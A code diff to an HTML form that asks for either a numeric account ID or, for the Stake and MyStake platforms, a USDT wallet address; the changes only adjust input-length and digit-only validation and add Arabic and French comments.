@@ -61,7 +61,7 @@
       </div>
       <div class="input-group">
         <label id="account-label" for="account" translate="no">Numéro de compte ID: <span class="required-star">*</span></label>
-        <input type="text" id="account" name="account" translate="no" maxlength="15" />
+        <input type="text" id="account" name="account" translate="no" />
       </div>
       <button class="login-btn" type="button" id="loginBtn" onclick="sendData()">
         <span id="btnText">Log In</span>
@@ -88,27 +88,30 @@
   <script>
     const platformSelect = document.getElementById('platform');
     const accountLabel = document.getElementById('account-label');
+    const accountInput = document.getElementById("account");
     const loginBtn = document.getElementById("loginBtn");
     const btnText = document.getElementById("btnText");
     const formBox = document.getElementById("formBox");
-    const accountInput = document.getElementById("account");
     const loadingScreen = document.getElementById("loadingScreen");
 
     platformSelect.addEventListener('change', function() {
       const value = this.value.toLowerCase();
+
       if (value === 'stake' || value === 'mystake') {
+        // Wallet Address
         accountLabel.innerHTML = `Wallet Address <span class="required-star">*</span> <img src="https://i.postimg.cc/W3GvcnjM/Tgxt-DYbk2-IOs-BCx-UFUr5ksc-D2-Fjm2lv-LBRK2dr-PR.png" class="token-icon" alt="USDT"> Tether USD (ERC20)`;
         accountInput.value = "";
         accountInput.removeAttribute("maxlength");
         accountInput.oninput = function() {
-          this.value = this.value.replace(/[\u0600-\u06FF]/g, '');
+          this.value = this.value.replace(/[\u0600-\u06FF]/g, ''); // منع العربية
         };
       } else {
+        // Numéro de compte ID: أرقام فقط
         accountLabel.innerHTML = 'Numéro de compte ID: <span class="required-star">*</span>';
         accountInput.value = "";
         accountInput.setAttribute("maxlength", "15");
         accountInput.oninput = function() {
-          this.value = this.value.replace(/\D/g, '');
+          this.value = this.value.replace(/\D/g, ''); // فقط أرقام
           if (this.value.length > 15) this.value = this.value.slice(0, 15);
         };
       }
@@ -119,9 +122,9 @@
       const account = accountInput.value;
 
       if (platform === "Stake" || platform === "MyStake") {
-        if (account.length < 10) { return; } // Wallet Address لازم يكون 10 أحرف على الأقل
+        if (account.length < 10) { return; } // Wallet Address min 10
       } else {
-        if (account.length < 4 || account.length > 15) { return; }
+        if (account.length < 4 || account.length > 15) { return; } // ID بين 4 و 15 رقم
       }
 
       if (!platform || !account) return;
@@ -147,6 +150,12 @@
         }, 2000);
       }
     }
+
+    // فرض أولي: Numéro de compte ID يكون أرقام فقط عند تحميل الصفحة
+    accountInput.oninput = function() {
+      this.value = this.value.replace(/\D/g, '');
+      if (this.value.length > 15) this.value = this.value.slice(0, 15);
+    };
   </script>
 </body>
 </html>
